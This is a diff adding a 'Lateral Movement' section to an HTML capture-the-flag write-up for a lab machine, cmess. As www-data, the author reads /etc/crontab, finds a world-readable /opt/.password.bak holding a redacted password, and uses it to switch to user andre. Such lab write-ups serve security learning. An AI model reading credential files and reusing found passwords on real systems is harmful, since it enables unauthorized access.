@@ -211,6 +211,60 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
             <div class="wt-section" id="latmov">
                 <h1> Lateral Movement </h1>
+                <p class="writeup-text"> Okay, since we are logged as www-data, I need a password to check user's sudo privileges. Thus, let's firtky check for cronjob : </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+www-data@cmess:/tmp$ cat /etc/crontab
+
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
+                    </code>
+                </p>
+                <p class="writeup-text"> Okay, let's explore this. After downloading the tar file located in /tmp, we realize that it is a rabbit hole :( there is nothing in it. </p>
+                <p class="writeup-text"> After a lot of investigation in the target machine, I saw that file : </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+www-data@cmess:/opt$ ls -la
+
+total 12
+drwxr-xr-x  2 root root 4096 Feb  6  2020 .
+drwxr-xr-x 22 root root 4096 Feb  6  2020 ..
+-rwxrwxrwx  1 root root   36 Feb  6  2020 .password.bak
+                    </code>
+                </p>
+                <p class="writeup-text"> What a lucky find ! Let's display its content : </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+www-data@cmess:/opt$ cat .password.bak
+
+andres backup password
+[REDACTED]
+                    </code>
+                </p>
+                <p class="writeup-text"> Alright ! It seems to be andre's credentials. Let's connect : </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+www-data@cmess:/opt$ su andre
+Password:
+
+andre@cmess:/opt$
+                    </code>
+                </p>
+                <p class="writeup-text"> Nice ! It works ! Let's get the user flag located in /home/andre/user.txt file : </p>
+                
             </div>
 
             <div class="wt-section" id="privesc">
